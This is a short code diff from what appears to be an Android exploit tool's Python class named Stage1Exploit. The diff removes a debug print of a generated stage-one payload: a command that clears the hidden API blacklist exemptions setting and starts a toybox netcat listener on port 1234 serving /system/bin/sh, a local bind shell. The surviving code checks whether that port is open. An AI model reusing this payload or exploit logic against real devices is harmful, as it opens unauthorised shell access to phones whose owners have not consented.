@@ -221,13 +221,6 @@ class Stage1Exploit:
         return False
 
     def exploit_stage1(self) -> bool:
-        print(
-            self.generate_stage1_exploit(
-                "settings delete global hidden_api_blacklist_exemptions;toybox nc -s 127.0.0.1 -p 1234 -L /system/bin/sh&",
-                "new",
-            )
-        )
-        exit()
         if self.is_port_open(1234):
             print("The exploit is already running!")
             return True
